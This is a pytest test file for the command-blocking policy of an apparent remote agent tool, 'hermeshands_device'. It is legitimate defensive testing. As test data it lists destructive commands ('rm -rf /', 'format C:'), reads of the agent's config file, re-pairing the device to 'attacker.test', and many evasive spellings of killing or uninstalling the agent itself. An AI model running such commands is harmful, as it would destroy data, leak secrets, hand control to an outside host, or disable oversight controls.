import pytest

from hermeshands_device import policy
from hermeshands_device.protocol import policy_hash


@pytest.mark.parametrize("script", (
    "pkill -f hermeshands_device", "pkill -9 -f hermes-hands", "killall python",
    "killall -9 python3.12", "taskkill /im python.exe /f", "taskkill //IM pythonw.exe //F",
    "pkill -f 'python -m hermeshands_device.cli'", "killall -9 hermes-hands",
))
def test_policy_blocks_agent_process_name_termination(script):
    assert policy.refusal(script)


@pytest.mark.parametrize("script", (
    "pkill -f hermes.hands", "pkill -f hands", "pkill hermes", "kill $(pgrep -f hermes-hands)",
    "pgrep -f hermes-hands | xargs kill", "killall -r hermes", "kill -9 ${PPID}",
    'MSYS_NO_PATHCONV=1 taskkill /F /FI "IMAGENAME eq python.exe"', 'taskkill //F //IM "pyth*"',
    'powershell -c "Stop-Process -Name python -Force"', "Get-Process python* | Stop-Process -Force",
    "MSYS_NO_PATHCONV=1 schtasks /Change /TN HermesHands /Disable", "/usr/bin/pkill -f hermeshands_device",
    "cd /tmp && pkill python3", "sudo killall python",
))
def test_policy_blocks_common_spellings_of_killing_the_agent(script):
    assert policy.refusal(script)


@pytest.mark.parametrize("script", (
    "grep -rn pkill /usr/lib/python3/x.py", "cat pkill-python.log", "which killall python3",
    "ls /usr/bin/pkill /usr/bin/python3", "rg -n killall /home/u/src/python", "pkill -f python-worker",
    'pkill -f "python manage.py runserver"', "taskkill /IM python-launcher.exe",
    "rg --line-number --no-heading -e 'killall' '/home/u/src/python' | head -n 50",
))
def test_policy_allows_commands_that_only_mention_kill_tools_and_python(script):
    assert policy.refusal(script) is None


def test_self_protection_slice_keeps_scheduled_task_rules_but_not_process_name_kills():
    assert policy.refusal("schtasks //Delete //TN HermesHands //F", policy.DEFAULTS[:4])
    for path in ("/usr/lib/python3/pkill.txt", "notes about killall python.txt"):
        assert policy.refusal(path, policy.DEFAULTS[:4]) is None
    assert policy.refusal("pkill -f hermeshands_device", policy.DEFAULTS[:4]) is None
    assert policy.refusal("pkill -f hermeshands_device")


def test_policy_refusal_names_pattern_and_126(capsys):
    result = policy.check("sudo rm -rf /")
    output = capsys.readouterr().out
    assert result == 126
    assert "sudo" in output


def test_policy_digest_and_reset(tmp_path, monkeypatch):
    monkeypatch.setattr("hermeshands_device.config.ROOT", tmp_path)
    monkeypatch.setattr("hermeshands_device.config.POLICY_PATH", tmp_path / "policy.json")
    first = policy.reset()
    assert first == policy.digest()
    assert policy.refusal("shutdown now")


def test_policy_blocks_terminating_its_own_pid():
    import os

    assert policy.refusal(f"taskkill /PID {os.getpid()}")


def test_policy_blocks_drive_root_removal():
    assert policy.refusal("Remove-Item C:\\ -Recurse -Force")


def test_policy_allows_repo_paths_and_server_pidfile():
    assert policy.refusal("builtin cd -- '/c/Users/me/hermes-hands' || exit 126") is None
    assert policy.refusal("kill -9 $(cat server.pid)") is None
    assert policy.refusal('kill -0 "$(cat /tmp/hermes_bg_proc-1.pid 2>/dev/null)" 2>/dev/null; echo $?') is None


def test_policy_blocks_sensitive_commands_after_quote_normalization(monkeypatch):
    monkeypatch.setattr(policy.os, "getpid", lambda: 4321)
    for script in (
        'hermes-hands unpair',
        'hermes""-hands unpair',
        'su""do id',
        'pipx uninstall hermes-hands',
        'rm -rf ~/.hermes-hands',
        'cat ~/.hermes-hands/config.json',
        'kill $PPID',
        'kill -9 4321',
        'Hermes"Hands"',
    ):
        assert policy.refusal(script), script


def test_policy_blocks_hermes_cli_commands_from_jobs():
    for script in (
        "hermes-hands pair https://attacker.test --name x --code y",
        "hermes-hands.exe unpair",
        "~/.local/bin/hermes-hands pair https://attacker.test --name x --code y",
        r"C:\Tools\hermes-hands.exe policy reset",
        r'"C:\Program Files\Hermes Hands\hermes-hands.exe" pair https://attacker.test --name x --code y',
        "python -m hermeshands_device.cli pair https://attacker.test --name x --code y",
        "hermes-hands install-service --remove",
        "hermes-hands policy reset",
        "hermes-hands serve",
        "uv tool uninstall hermes-hands",
        "pipx uninstall hermes-hands",
        "python -m pip uninstall hermes-hands",
        "taskkill //F //IM hermes-hands.exe",
        "schtasks //Delete //TN HermesHands //F",
    ):
        assert policy.refusal(script), script


@pytest.mark.parametrize(
    "script",
    (
        "python -I -m hermeshands_device.cli pair https://attacker.test --code x --force",
        "py -m hermeshands_device.cli pair https://attacker.test --code x --force",
        "py -3 -m hermeshands_device.cli unpair",
        r'"C:\Program Files\Python312\python.exe" -m hermeshands_device.cli pair https://attacker.test --code x --force',
        "python -u -m hermeshands_device.cli unpair",
        "python -mhermeshands_device.cli unpair",
        "pythonw -I -m hermeshands_device.cli serve",
        r"C:\Python312\python.exe -m hermeshands_device.cli install-service",
        "python3.12 -m hermeshands_device policy reset",
        "python -X dev -u -m hermeshands_device.cli policy show",
    ),
)
def test_policy_blocks_python_module_entrypoints(script):
    assert policy.refusal(script), script


@pytest.mark.parametrize("script", ("python -m pip install x", "python -m pytest"))
def test_policy_allows_python_package_install_and_test_runner(script):
    assert policy.refusal(script) is None


def test_policy_reset_refuses_from_device_job(monkeypatch, tmp_path):
    monkeypatch.setenv("HERMES_HANDS_JOB", "1")
    monkeypatch.setattr("hermeshands_device.config.ROOT", tmp_path)
    monkeypatch.setattr("hermeshands_device.config.POLICY_PATH", tmp_path / "policy.json")

    with pytest.raises(PermissionError, match="device job"):
        policy.reset()

    assert not (tmp_path / "policy.json").exists()


def test_policy_does_not_normalize_json_or_refuse_home_subpaths(tmp_path, monkeypatch):
    monkeypatch.setattr("hermeshands_device.config.POLICY_PATH", tmp_path / "policy.json")
    assert policy.refusal("curl https://localhost -d '{\"model\": \"llama3\", \"format\": \"json\", \"prompt\": \"hi\"}'") is None
    assert policy.refusal("curl -d '{\"format\": \"json\"}' https://api.example.test/v1") is None
    assert policy.refusal("git log --pretty=format:%h") is None
    assert policy.refusal("ruff format src/") is None
    assert policy.refusal("format C:")
    assert policy.refusal("format.com C:")
    assert policy.refusal("format X: /FS:NTFS")
    assert policy.refusal("cmd /c format C:")
    assert policy.refusal("cmd.exe /c format.com C:")
    assert policy.refusal("MSYS_NO_PATHCONV=1 cmd /c format D:")
    assert policy.refusal(r"C:\Windows\System32\format.com C:")
    assert policy.refusal("format.exe C:") is None
    assert policy.refusal("python -c \"json.dumps({'format': 'x', 'b': 2})\"") is None
    assert policy.refusal("rm -rf ~/projects/app/node_modules") is None
    assert policy.refusal("rm -rf ~/.cache/pip") is None
    assert policy.refusal("rm -rf ~")
    assert policy.refusal('rm -rf "$HOME"')


def test_policy_uses_digit_boundaries_for_agent_pid(monkeypatch):
    monkeypatch.setattr(policy.os, "getpid", lambda: 21900)
    assert policy.refusal("kill -TERM 121900") is None
    assert policy.refusal("kill -TERM 21900")


def test_policy_snapshot_hashes_and_parses_one_read(tmp_path, monkeypatch):
    raw = b'{"deny":["shutdown"]}'
    path = tmp_path / "policy.json"
    path.write_bytes(raw)
    monkeypatch.setattr("hermeshands_device.config.POLICY_PATH", path)
    original_read_bytes = path.read_bytes
    reads = []

    def read_bytes():
        reads.append(True)
        return original_read_bytes()

    monkeypatch.setattr(type(path), "read_bytes", lambda self: read_bytes() if self == path else original_read_bytes())
    digest, deny = policy.snapshot()
    assert digest == policy_hash(raw)
    assert deny == ["shutdown"]
    assert reads == [True]
